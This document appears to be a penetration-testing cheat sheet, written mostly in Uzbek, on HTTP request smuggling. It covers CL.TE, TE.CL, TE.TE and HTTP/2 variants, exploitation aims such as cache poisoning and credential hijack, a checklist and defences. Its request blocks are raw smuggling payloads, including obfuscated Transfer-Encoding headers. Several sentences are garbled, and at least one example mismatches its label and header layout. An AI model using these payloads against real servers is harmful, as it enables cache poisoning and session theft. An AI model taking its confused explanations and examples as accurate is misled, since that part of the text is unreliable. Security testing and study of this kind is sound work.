# HTTP Request Smuggling

## 1. Ta'rif
HTTP Request Smuggling (HRS) — bir front (proxy/load-balancer/CDN) va backend request'ni turlicha talqin qiladi. Attacker backend'ga o'z request'ini "bijitadi", boshqa user request'larini zaharlaydi → cache poisoning, credential steal, SSRF, RCE.

## 2. Qayerdan kelib chiqadi
- Content-Length (CL) va Transfer-Encoding (TE) header'lari mavjud bo'lsa
- Front CL, back TE (CL.TE) yoki aksincha (TE.CL), TE.TE obfuscation
- Header normalizatsiya (nginx -> apache), upper/lower, spaces, tabs
- HTTP/2 → header continuation (H2.CL, H2.TE)
- Chunked yuborilayotganda content uzunligi hisobidagi xato (Buffer kiritish)

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| CL.TE | front Content-Length, back Transfer-Encoding |
| TE.CL | front TE, back CL |
| TE.TE | obfuscated TE (front qabul, back qabul qilmaydi) |
| H2.CL / H2.TE | HTTP/2 downgrade |
| CL.0 | front CL=0, back 0-siz body |

## 4. Metodologiya
1. Tekshirish vositalari:
   - Timing technique (obfuscated) — sleep istiqboli
   - Detection: front back farq uchun `Confirm` — query aytilmagan havola
   - Burp: Repeater + Intruder / `httpx-smuggling` scripts
2. Test asosiy (kick-back/buffer):
   ```
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 4
   Transfer-Encoding: chunked
   5c
   GPOST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15
   x=1
   0

   → keyingi request "GPOST ..." bilan boshlansa (400/404) → zaif
   ```
3. CL.TE — qayerda server'day qaysiniga tekshirish:
   Recall prior request'ning zaif afzalligi.
4. TE.CL sinash — teskarisi.
5. HTTP/2: https://patchsmuggling.netlify.app/blog/2048 (smuggling üçün yana Bir) dan request converter.

## 5. Request misollari
```
# CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G

# TE.CL
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /evil HTTP/1.1
Host: victim.com

0

# TE.TE (obfuscated)
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
```
## 6. Exploitation
- Cache Poisoning: payload'la cache keyga yetuvchi URL -- boshqa user'ning request'iga javob sifatida
- Credential/API key hijack (request'ni boshqa user flash)
- JS injection through cache
- WebSocket hijack
- `X-Forwarded-*` header injection → SSRF
## 7. Nimalarga ahamiyat berish (checklist)
- [ ] Front-end backendga nisbatan talqin farqi (proxies)
- [ ] Chunked/CL header'lar to'liq tekshirish
- [ ] HTTP/1.1 va HTTP/2 clientlarini sinash (H2C)
- [ ] `Transfer-Encoding: chunked, chunked`, `x-chunked`
- [ ] `Content-Length: 5` vs body len
- [ ] Http/2 prior knowledge: `Content-Length` in HTTP/2 body
- [ ] Request'da space/tab/tab-nul normal-to-tekshirish
## 8. Himoya
- Front/back bir xil parser; TEni disallow (backend)
- Normalize headers strictly; reject malformed
- HTTP/2 end-to-end, no downgrade
- Patch/WAF signatures, testing suit qo'lda det